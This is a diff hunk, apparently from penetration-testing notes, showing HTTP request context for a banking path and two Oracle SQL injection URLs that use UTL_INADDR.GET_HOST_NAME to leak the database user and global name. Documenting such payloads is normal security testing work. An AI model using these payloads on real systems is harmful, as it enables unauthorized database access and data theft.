@@ -58,6 +58,8 @@ Accept-Language: en-US,en;q=0.5
 Accept-Encoding: gzip, deflate
 Referer: https://122.248.119.25/B001/banking?fldsegment=EN1
 ```
+
+
 ```
 https://10.10.10.13:7001/product.jsp?=info ||UTL_INADDR.GET_HOST_NAME( (SELECT user FROM DUAL) )--
 https://10.10.10.13:7001/product.jsp?=info ||UTL_INADDR.GET_HOST_NAME( (SELECT global_name FROM global_name;) )--
